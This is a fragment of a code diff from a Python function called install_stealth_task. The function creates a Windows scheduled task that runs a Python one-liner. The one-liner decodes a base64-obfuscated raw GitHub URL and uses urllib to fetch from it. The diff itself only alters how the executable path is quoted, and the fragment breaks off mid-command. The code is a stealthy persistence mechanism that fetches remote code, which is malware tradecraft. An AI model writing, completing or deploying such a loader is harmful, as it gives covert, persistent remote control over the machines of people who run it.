@@ -117,7 +117,7 @@ def install_stealth_task():
         url_b64 = base64.b64encode(RAW_GITHUB_URL.encode("utf-8")).decode("ascii")
         
         action = task_def.Actions.Create(0)
-        action.Path = f'"{exe_path}"'
+        action.Path = str(exe_path)
         action.Arguments = (
             f'-c "import urllib.request,base64;'
             f'u=base64.b64decode(\'{url_b64}\').decode();'
